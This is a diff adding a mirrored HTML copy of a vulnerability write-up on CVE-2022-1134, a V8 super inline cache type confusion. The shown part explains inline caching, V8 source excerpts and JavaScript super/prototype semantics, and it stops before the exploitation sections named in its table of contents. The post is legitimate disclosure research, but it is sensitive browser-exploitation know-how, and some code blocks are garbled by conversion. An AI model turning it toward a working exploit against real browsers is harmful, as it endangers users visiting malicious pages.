@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+  <meta name="generator" content="Hexo 5.4.1">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <link rel="dns-prefetch" href="//unpkg.com">
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>The Chromium Super (Inline Cache) Type Confusion - RSSBOX</title>
+
+  
+
+  
+    <meta name="description" content="In this post I’ll exploit CVE-2022-1134, a type confusion in V8, the JavaScript engine of Chrome that I reported in March 2022, as bug 1308360 and was fixed in version 100.0.4896.60. This bug allow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Chromium Super (Inline Cache) Type Confusion">
+<meta property="og:url" content="https://rssbox.mhuig.top/rss/e17ac22.html">
+<meta property="og:site_name" content="RSSBOX">
+<meta property="og:description" content="In this post I’ll exploit CVE-2022-1134, a type confusion in V8, the JavaScript engine of Chrome that I reported in March 2022, as bug 1308360 and was fixed in version 100.0.4896.60. This bug allow">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-1.png?resize=494%2C279">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-2.png?resize=860%2C457">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-3.png?resize=960%2C540">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-4.png?resize=554%2C388">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-5.png?resize=960%2C540">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-6.png?resize=960%2C540">
+<meta property="og:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-7.png?resize=491%2C154">
+<meta property="article:published_time" content="2022-06-29T10:39:46.000Z">
+<meta property="article:modified_time" content="2022-06-29T10:39:46.000Z">
+<meta property="article:author" content="MHuiG">
+<meta property="article:tag" content="These Blogs">
+<meta property="article:tag" content="Github">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cors.mhuig.top/?r=https://github.blog&url=https://github.blog/wp-content/uploads/2022/06/Chromium-1.png?resize=494%2C279">
+  
+  
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="RSSBOX" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class="l_body" id="start">
+    <aside class="l_left" layout="post">
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" target="_blank" rel="noopener" href="https://mhuig.top/"><div class="bg" style="opacity:0;background-image:url(https://static.mhuig.top/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://static.mhuig.top/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">RSSBOX</div><div class="sub normal cap">MHuiGのRSS订阅</div><div class="sub hover cap" style="opacity:0">rssbox.mhuig.top</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">RSS</a><a class="nav-item" target="_blank" rel="noopener" href="https://blog.mhuig.top/">博客</a><a class="nav-item" target="_blank" rel="noopener" href="https://mhuig.top/">关于</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#inline-cache-in-v8"><span class="toc-text">Inline cache in V8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bytecode-handling-in-v8"><span class="toc-text">Bytecode handling in V8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#caching-and-using-property-access-handler"><span class="toc-text">Caching and using property access handler</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javascript-inheritance-101"><span class="toc-text">JavaScript inheritance 101</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#the-superic-trilogy"><span class="toc-text">The SuperIC trilogy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#megamorphic-inline-cache"><span class="toc-text">Megamorphic inline cache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-vulnerability"><span class="toc-text">The vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#interactions-between-v8-and-blink"><span class="toc-text">Interactions between V8 and Blink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploiting-the-bug"><span class="toc-text">Exploiting the bug</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gaining-arbitrary-read-primitive"><span class="toc-text">Gaining arbitrary read primitive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getting-object-address"><span class="toc-text">Getting object address</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#creating-arbitrary-fake-object"><span class="toc-text">Creating arbitrary fake object</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#the-four-part-trilogy"><span class="toc-text">The four-part trilogy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#conclusions"><span class="toc-text">Conclusions</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/MHuiG" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"></a><a class="social" href="https://music.163.com/#/user/home?id=63035382" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/3845874.svg"></a><a class="social" href="/contact/" rel="noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://static.mhuig.top/gh/cdn-x/placeholder@1.0.3/social/a1b00e20f425d.svg"></a></div></footer>
+
+    </aside>
+    <div class="l_main">
+      
+
+      
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/these-blogs/">These Blogs</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/these-blogs/github/">Github</a></div><div id="post-meta">发布于&nbsp;<time datetime="2022-06-29T10:39:46.000Z">2022-06-29</time></div></div>
+
+<article class="content md post">
+<h1 class="article-title"><span>The Chromium Super (Inline Cache) Type Confusion</span></h1>
+<div>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+
+<html><body><p>In this post I’ll exploit CVE-2022-1134, a type confusion in V8, the JavaScript engine of Chrome that I reported in March 2022, as <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=1308360">bug 1308360</a> and was fixed in version <a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_29.html">100.0.4896.60</a>. This bug allows remote code execution (RCE) in the renderer sandbox of Chrome by a single visit to a malicious site. The bug exists in the super inline cache (SuperIC) feature, which has a history of exploitable vulnerabilities. In what follows, I’ll go through some implementation details of the inline cache, as well as interactions between V8 and Blink (the Chrome renderer), to fill in the background required to understand and exploit this bug.</p>
+<h2 id="inline-cache-in-v8">Inline cache in V8<a aria-label="Inline cache in V8" class="heading-link pl-2 text-italic text-bold" href="#inline-cache-in-v8"></a></h2>
+<p>Inline cache is an optimization used in V8 for speeding up property accesses in bytecode generated by <a target="_blank" rel="external nofollow noopener noreferrer" href="https://v8.dev/docs/ignition">Ignition</a> (the interpreter in V8). Roughly speaking, when a JavaScript function is run, Ignition will compile the function into bytecode, which then collects profiling data and feedback every time the function is run. The feedback is then used by the JIT compiler to generate optimized machine code at a later stage. As the V8 optimization pipeline is very well documented, I’ll not repeat the details here, but refer readers to <a target="_blank" rel="external nofollow noopener noreferrer" href="https://v8.dev/docs/ignition">this article</a> and the references within. Readers may also wish to consult <a target="_blank" rel="external nofollow noopener noreferrer" href="https://mathiasbynens.be/notes/shapes-ics">“JavaScript engine fundamentals: Shapes and Inline Caches”</a> by Mathias Bynens to get a high-level understanding of object types and inline cache in V8.</p>
+<p>To distinguish between object types and optimize property accesses, each JavaScript object in V8 stores a <code>map</code> as its first property:</p>
+<pre><code>DebugPrint: 0x282908049499: [JS_OBJECT_TYPE]
+ - map: 0x282908207939 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ ...
+0x282908207939: [Map]
+ - type: JS_OBJECT_TYPE
+ - instance size: 16
+ - inobject properties: 1
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: 1
+ ...
+</code></pre>
+<p>The <code>map</code> of an object stores important information, such as the <code>type</code> of the object, and the offsets of each of its properties. The memory layout of objects with the same map are the same, meaning that their properties are at the same offsets. This allows property accesses to be optimized once the <code>map</code> of an object is known. In overly simplified terms, when the bytecode for a property access is run, the maps of the input objects are recorded, and an optimized handler is created for each <code>map</code>. When the function is run in the future, if an object of a known <code>map</code> is passed, the optimized handler corresponding to this <code>map</code> is used to access the property of the object.</p>
+<h3 id="bytecode-handling-in-v8">Bytecode handling in V8<a aria-label="Bytecode handling in V8" class="heading-link pl-2 text-italic text-bold" href="#bytecode-handling-in-v8"></a></h3>
+<p>To get a better understanding of what actually happens, I’ll now go through a concrete example to show the general process of inline caching. Take the following function as an example:</p>
+<pre><code>function f(a) &#123;
+  return a.x
+&#125;
+</code></pre>
+<p>I can run it in V8 and use the <code>print-bytecode</code> flag to print out the generated bytecode</p>
+<pre><code>[generated bytecode for function: f (0x11e7001d36cd &lt;SharedFunctionInfo f&gt;)]
+...
+Bytecode Age: 0
+         0x11e7001d3886 @    0 : 2d 03 00 00       GetNamedProperty a0, [0], [0]
+         0x11e7001d388a @    4 : a9                Return 
+</code></pre>
+<p>We see that <code>GetNamedProperty</code> is the bytecode generated for the property access <code>a.x</code>. In V8, property accesses are divided into <code>NamedProperty</code> and <code>KeyedProperty</code>, where <code>NamedProperty</code> refers to the usual properties that are accessed as a property, for example, <code>a.x</code>, while <code>KeyedProperty</code> refers to element-like properties that are indexed numerically, for example, <code>a[1]</code>. Therefore, for example, the following function</p>
+<pre><code>function f(a) &#123;
+  return a[1]
+&#125;
+</code></pre>
+<p>generates the <code>GetKeyedProperty</code> bytecode instead:</p>
+<pre><code>[generated bytecode for function: f (0x1e8d001d36cd &lt;SharedFunctionInfo f&gt;)]
+...
+Bytecode Age: 0
+         0x1e8d001d386a @    0 : 0d 01             LdaSmi [1]
+         0x1e8d001d386c @    2 : 2f 03 00          GetKeyedProperty a0, [0]
+         0x1e8d001d386f @    5 : a9                Return 
+</code></pre>
+<p>The bytecodes generated are handled by various <code>[IGNITION_HANDLER](https://source.chromium.org/chromium/chromium/src/+/c4430196c7c0ca1445dc48151912e659c80fc913:v8/src/interpreter/interpreter-generator.cc;l=41)</code>. For example, the <code>GetNamedProperty</code> bytecode is handled by <a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/c4430196c7c0ca1445dc48151912e659c80fc913:v8/src/interpreter/interpreter-generator.cc;l=522">the following handler</a>.</p>
+<pre><code>IGNITION_HANDLER(GetNamedProperty, InterpreterAssembler) &#123;
+  ...
+  accessor_asm.LoadIC_BytecodeHandler(&amp;params, &amp;exit_point);
+
+<p>  BIND(&amp;done);<br>  &amp;#123;<br>    SetAccumulator(var_result.value());<br>    Dispatch();<br>  &amp;#125;<br>&amp;#125;<br></p></code></pre><p></p>
+<p>The handler delegates the task to <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/c4430196c7c0ca1445dc48151912e659c80fc913:v8/src/ic/accessor-assembler.cc;drc=242da5037807dde3daf097ba74f875db83b8b613;l=2992">LoadIC_BytecodeHandler</a></code>. This function inspects the feedback collected by this particular bytecode (that is, the input passed to this bytecode operation so far) and determines how the property should be accessed. When the function is first run, there isn’t any feedback, so the property access simply falls back to the slow runtime implementation. At the same time, feedback is collected, and optimized property access handlers are cached for the object <code>map</code> that was seen.</p>
+<pre><code>void AccessorAssembler::LoadIC_BytecodeHandler(const LazyLoadICParameters* p,
+                                               ExitPoint* exit_point) &#123;
+  ...
+  GotoIf(IsUndefined(p-&gt;vector()), &amp;no_feedback);
+
+<p>  …<br>  BIND(&amp;no_feedback);      &#x2F;&#x2F;&lt;———- no feedback, falls back to runtime implementation<br>  &amp;#123;<br>    Comment(“LoadIC_BytecodeHandler_nofeedback”);<br>    &#x2F;&#x2F; Call into the stub that implements the non-inlined parts of LoadIC.<br>    exit_point-&gt;ReturnCallStub(<br>        Builtins::CallableFor(isolate(), Builtin::kLoadIC_NoFeedback),<br>        p-&gt;context(), p-&gt;receiver(), p-&gt;name(),<br>        SmiConstant(FeedbackSlotKind::kLoadProperty));<br>  &amp;#125;<br>  …<br>&amp;#125;<br></p></code></pre><p></p>
+<p>After feedback is collected, the bytecode handler will try to look for a cached optimized property handler that is suitable for accessing the property of the current input:</p>
+<pre><code>void AccessorAssembler::LoadIC_BytecodeHandler(const LazyLoadICParameters* p,
+                                               ExitPoint* exit_point) &#123;
+  ...
+  // Inlined fast path.
+  &#123;
+    Comment("LoadIC_BytecodeHandler_fast");
+
+<pre><code>TVARIABLE(MaybeObject, var_handler);
+Label try_polymorphic(this), if_handler(this, &amp;amp;var_handler);
+
+TNode&amp;lt;MaybeObject&amp;gt; feedback = TryMonomorphicCase(           //&amp;lt;-------- Look for cached handler
+    p-&amp;gt;slot(), CAST(p-&amp;gt;vector()), lookup_start_object_map, &amp;amp;if_handler,
+    &amp;amp;var_handler, &amp;amp;try_polymorphic);
+
+BIND(&amp;amp;if_handler);  //&amp;lt;--------- handler found
+HandleLoadICHandlerCase(p, CAST(var_handler.value()), &amp;amp;miss, exit_point);  //&amp;lt;------- try to use optimized handler
+...
+</code></pre>
+<p>  &amp;#125;<br>&amp;#125;<br></p></code></pre><p></p>
+<p>If a handler is found, then it’s used to optimize the property access. If the handler is not found, or for some reason, the object fails certain checks, then a cache miss happens, and the function falls back to the slow path (bailout).</p>
+<h3 id="caching-and-using-property-access-handler"><strong><span id="cachingandusingpropertyaccesshandler">Caching and using property access handler</span></strong><a aria-label="&lt;strong&gt;&lt;span id="cachingandusingpropertyaccesshandler"&gt;Caching and using property access handler&lt;/span&gt;&lt;/strong&gt;" class="heading-link pl-2 text-italic text-bold" href="#caching-and-using-property-access-handler"></a></h3>
+<p>When a cache miss happens, for example, because there is not enough feedback or because the object has a previously unknown <code>map</code>, various <code>*IC_Miss</code> runtime functions can be called to handle the case. In the case of a load, the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/ic.cc;l=2688;drc=242da5037807dde3daf097ba74f875db83b8b613">LoadIC_Miss</a></code> function is called:</p>
+<pre><code>RUNTIME_FUNCTION(Runtime_LoadIC_Miss) &#123;
+  ...
+  FeedbackSlotKind kind = vector-&gt;GetKind(vector_slot);
+  if (IsLoadICKind(kind)) &#123;
+    LoadIC ic(isolate, vector, vector_slot, kind);
+    ...
+    RETURN_RESULT_OR_FAILURE(isolate, ic.Load(receiver, key));
+
+<p>  &amp;#125; …<br></p></code></pre><p></p>
+<p>In this case, a <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/ic.h;drc=49ce0f669d3e54b41b29cd8ad6213e28cf8fa8bc;l=181">LoadIC</a></code> object is created, and its <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/ic.cc;l=415">Load</a></code> method is called. The <code>LoadIC::Load</code> method does not just bail out at runtime to perform the actual property load, but it also creates and caches a new optimized handler for when this case is next encountered. Apart from the <code>map</code> of the object, various properties of the object are used to create the handler.</p>
+<pre><code>MaybeHandle&lt;Object&gt; LoadIC::Load(Handle&lt;Object&gt; object, Handle&lt;Name&gt; name,
+                                 bool update_feedback,
+                                 Handle&lt;Object&gt; receiver) &#123;
+  ...
+  PropertyKey key(isolate(), name);
+  LookupIterator it = LookupIterator(isolate(), receiver, key, object);
+  ...
+  if (it.IsFound() || !ShouldThrowReferenceError()) &#123;
+    // Update inline cache and stub cache.
+    if (use_ic) &#123;
+      UpdateCaches(&amp;it);        //&lt;--------- update inline cache
+    &#125; ...
+  &#125;...
+</code></pre>
+<p><code>UpdateCaches</code> then calls <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/ic.cc;l=932">ComputeHandler</a></code> to create a new handler and update the inline cache when appropriate.</p>
+<pre><code>Handle&lt;Object&gt; LoadIC::ComputeHandler(LookupIterator* lookup) &#123;
+    ...
+    case LookupIterator::ACCESSOR: &#123;
+      Handle&lt;JSObject&gt; holder = lookup-&gt;GetHolder&lt;JSObject&gt;();
+      ...
+      FieldIndex field_index;
+      if (Accessors::IsJSObjectFieldAccessor(isolate(), map, lookup-&gt;name(),
+                                             &amp;field_index)) &#123;
+        TRACE_HANDLER_STATS(isolate(), LoadIC_LoadFieldDH);
+        return LoadHandler::LoadField(isolate(), field_index);  //&lt;-- Creates new handler
+      &#125;
+      ...
+   &#125;
+   ...
+&#125;
+</code></pre>
+<p><code>ComputeHandler</code> uses the type of the property accessor (for example, simple data property, property defined by getter and setter, etc.), which is determined by the object <code>map</code> (and property name, which is fixed for the <code>GetNamedProperty</code> operation), to determine how to create the handler, and there may be further subcases within each case. For example, in the above, if the property is defined via a getter and setter pair (<code>ACCESSOR</code> case), and accesses the <code>length</code> property of either <code>Array</code> or <code>String</code> (which is what <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/builtins/accessors.cc;drc=cfcdde121f7532b2fa28a2997722374169b7d46f;l=67">IsJSObjectFieldAccessor</a></code> is checking), then <code>LoadHandler::LoadField</code> will return a handler of the kind <code>kField</code>, with the <code>field_index</code>, which is the offset of the field, encoded in the handler.</p>
+<p>When the JavaScript function is run again, the <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/accessor-assembler.cc;l=3068">AccessorAssembler::LoadIC</a></code> function is called when the bytecode <code>GetNameProperty</code> is handled by <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/c4430196c7c0ca1445dc48151912e659c80fc913:v8/src/ic/accessor-assembler.cc;drc=242da5037807dde3daf097ba74f875db83b8b613;l=2992">LoadIC_BytecodeHandler</a></code>. This first looks for a cached handler using <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/accessor-assembler.cc;l=3086">TryMonomorphicCase</a></code>. In this simple case, if the variable is of type <code>Array</code> or <code>String</code>, the handler created from before is found and applied using <code><a target="_blank" rel="external nofollow noopener noreferrer" href="https://source.chromium.org/chromium/chromium/src/+/af93b3d584c22547ae5d6c49c56df07f2f7a2ca5:v8/src/ic/accessor-assembler.cc;l=633">HandleLoadICSmiHandlerLoadNamedCase</a></code>:</p>
+<pre><code>void AccessorAssembler::HandleLoadICSmiHandlerLoadNamedCase(
+    const LazyLoadICParameters* p, TNode&lt;Object&gt; holder,
+    TNode&lt;IntPtrT&gt; handler_kind, TNode&lt;WordT&gt; handler_word, Label* rebox_double,
+    TVariable&lt;Float64T&gt;* var_double_value, TNode&lt;Object&gt; handler, Label* miss,
+    ExitPoint* exit_point, ICMode ic_mode, OnNonExistent on_nonexistent,
+    ElementSupport support_elements) &#123;
+  ...
+
+<p>  GotoIf(WordEqual(handler_kind, LOAD_KIND(kField)), &amp;field);<br>  …<br>  BIND(&amp;field);<br>  &amp;#123;<br>    …<br>    HandleLoadField(CAST(holder), handler_word, var_double_value, rebox_double,<br>                    miss, exit_point);  &#x2F;&#x2F;&lt;—– loads the field from an offset encoded in <code>handler_word</code><br>    …<br>  &amp;#125;<br>  …<br>&amp;#125;<br></p></code></pre><p></p>
+<p>In this case, the handler (<code>handler_word</code>) is of the kind <code>kField</code> with the field offset encoded in it. The <code>HandleLoadField</code> then loads the field from the field offset directly, removing the need to load and call the getter.</p>
+<p>While the inline cache optimizes property accesses, care must be taken to ensure that the assumptions made when the handler is created remain valid when the handler is used in the case of a cache match.</p>
+<h2 id="javascript-inheritance-101">JavaScript inheritance 101<a aria-label="JavaScript inheritance 101" class="heading-link pl-2 text-italic text-bold" href="#javascript-inheritance-101"></a></h2>
+<p>The vulnerability is in the handling of <code>super</code> property accesses in the inline cache. In this section, I’ll briefly explain the concept of the <code>super</code> property in JavaScript.</p>
+<p>Readers who are familiar with other object oriented languages, such as Java and C++, may be surprised by how the <code>super</code> property works in JavaScript. Instead of accessing properties in the parent class, like in Java and C++:</p>
+<pre><code>class A &#123;
+    int foo = 1;
+&#125;
+
+<p>class B extends A &amp;#123;<br>    public B() &amp;#123;<br>        super();<br>        super.foo; &#x2F;&#x2F;&lt;—- 1<br>    &amp;#125;<br>&amp;#125;<br></p></code></pre><p></p>
+<p>The same code in JavaScript results in <code>super.foo</code> being undefined:</p>
+<pre><code>class A &#123;
+    foo = 1;
+&#125;
+
+<p>class B extends A &amp;#123;<br>    constructor() &amp;#123;<br>        super();<br>        super.foo; &#x2F;&#x2F;&lt;—— undefined<br>    &amp;#125;<br>&amp;#125;<br></p></code></pre><p></p>
+<p>For data properties, <code>super.foo</code> behaves similarly to <code>this.foo</code> and returns <code>undefined</code> unless the field is also defined explicitly on the object that calls <code>super.foo</code> (Readers who are in for a headache, can follow the discussions <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/tc39/proposal-class-fields/issues/266">here</a>). For property accessors (that is, properties, defined via getter and setter), however, the behavior is more consistent with other languages, in that the accessor defined in the parent class is called, with the <code>this</code> object being the calling object (receiver):</p>
+<pre><code>class A &#123;
+  get prop() &#123;
+    return this.a;
+  &#125;
+&#125;
+
+<p>class B extends A &amp;#123;<br>  constructor() &amp;#123;<br>    super();<br>    this.a &#x3D; ‘B’;<br>  &amp;#125;<br>  m() &amp;#123;<br>    return super.prop;<br>  &amp;#125;<br>&amp;#125;</p>
+<p>var b &#x3D; new B();<br>b.m();  &#x2F;&#x2F;&lt;—— ‘B’<br></p></code></pre><p></p>
+<p>As JavaScript classes are really defined via prototypes, all of the above can equally be done via prototype:</p>
+<pre><code>class B &#123;
+  m() &#123;
+    return super.prop;
+  &#125;
+&#125;
+
+<p>B.prototype.<strong>proto</strong> &#x3D; &amp;#123;get prop() &amp;#123;return this.x&amp;#125;&amp;#125;;</p>
+<p>var b &#x3D; new B();<br>b.x &#x3D; 1;<br>b.m() &#x2F;&#x2F;&lt;——– 1<br></p></code></pre><p></p>
+<p>In <code>B.prototype.__proto__</code> above, <code>B</code> is treated as the constructor of the class <code>B</code>. The field <code>prototype</code> of a function, when treated as a constructor, is the prototype of the object that this constructor is going to create:</p>
+<pre><code>%DebugPrint(B.prototype);
+DebugPrint: 0x1c120004af39: [JS_OBJECT_TYPE]
+ - map: 0x1c1200207d29 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x1c12001c4281 &lt;Object map = 0x1c12002021e9&gt;
+ - elements: 0x1c1200002261 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties: 0x1c120004afb9 &lt;PropertyArray[2]&gt;
+ - All own properties (excluding elements): &#123;
+    0x1c1200004619: [String] in ReadOnlySpace: #constructor: 0x1c120004aefd &lt;JSFunction B (sfi = 0x1c12001d374d)&gt; (const data field 0), location: properties[0]
+    0x1c12001d3669: [String] in OldSpace: #m: 0x1c120004af1d &lt;JSFunction m (sfi = 0x1c12001d3781)&gt; (const data field 1), location: properties[1]
+ &#125;
+</code></pre>
+<p>This shows that the prototype of the object created by using <code>B</code> as a constructor has the <code>constructor</code> field as the function <code>B</code> and a method <code>m</code>, which is an object defined by class <code>B</code>. This prototype is, of course, just a JavaScript object, which means it can also have a prototype of its own. This is specified by the <code>__proto__</code> field. This prototype type (<code>B.prototype.__proto__</code>) now specifies a class inheritance. An object created by calling the constructor <code>B</code> now inherits the <em>data properties</em> and methods in <code>B.prototype.__proto__</code>. This is similar to saying that <code>B.prototype.__proto__</code> is the template of an object in the parent class of <code>B</code>. This can be seen via the class inheritance syntax:</p>
+<pre><code>class A &#123;
+  get prop() &#123;
+    return this.a;
+  &#125;
+&#125;
+
+<p>class B extends A &amp;#123;<br>&amp;#125;</p>
+<p>%DebugPrint(B.prototype.<strong>proto</strong>)<br></p></code></pre><p></p>
+<p>The above gives this output in V8:</p>
+<pre><code>DebugPrint: 0x24750004adf1: [JS_OBJECT_TYPE]
+ ...
+ - All own properties (excluding elements): &#123;
+   prop: 0x2475001d3a85 &lt;AccessorPair&gt; (accessor, dict_index: 2, attrs: [W_C])
+   constructor: 0x24750004adb5 &lt;JSFunction A (sfi = 0x2475001d3745)&gt; (data, dict_index: 1, attrs: [W_C])
+ &#125;
+</code></pre>
+<p>This shows that <code>B.prototype.__proto__</code> is an object created by the constructor of class <code>A</code>. The main difference between using the class syntax and the prototype syntax is that, with the prototype syntax, a concrete object can now be supplied as the parent class object template, which means that it is possible to access data properties of the <code>B.prototype.__proto__</code> object as <code>super</code> properties:</p>
+<pre><code>class B &#123;
+  m() &#123;
+    return super.prop;
+  &#125;
+&#125;
+
+<p>B.prototype.<strong>proto</strong> &#x3D; &amp;#123;prop : 1&amp;#125;;</p>
+<p>var b &#x3D; new B();<br>b.m() &#x2F;&#x2F;&lt;——– 1<br></p></code></pre><p></p>
+<p>Not only that, it is even possible to have an object and its parent class object have different JavaScript types:</p>
+<pre><code>class B &#123;
+  m() &#123;
+    return super.length;
+  &#125;
+&#125;
+
+<p>var b &#x3D; new B();<br>B.prototype.<strong>proto</strong> &#x3D; new Int8Array(1);<br>b.m();  &#x2F;&#x2F;&lt;—- throw TypeError<br></p></code></pre><p></p>
+<p>The above code throws a <code>TypeError</code> when the accessor to <code>length</code> from <code>TypedArray</code> (<code>Int8Array</code>) is called on the object <code>B</code>, which is of <code>JS_OBJECT_TYPE</code>, instead of <code>JS_TYPED_ARRAY_TYPE</code>, so a <code>TypeError</code> is thrown when the accessor is applied to the object <code>b</code>, which is of the wrong type. In this case, it is important that the type check is performed, as the <code>length</code> accessor of <code>TypedArray</code> assumes the object has the layout of a <code>TypedArray</code> and would cause type confusion if it operates on an object of different type (for example, <code>JS_OBJECT</code>). This point is important to our vulnerability.</p>
+<h2 id="the-superic-trilogy">The SuperIC trilogy<a aria-label="The SuperIC trilogy" class="heading-link pl-2 text-italic text-bold" href="#the-superic-trilogy"></a></h2>
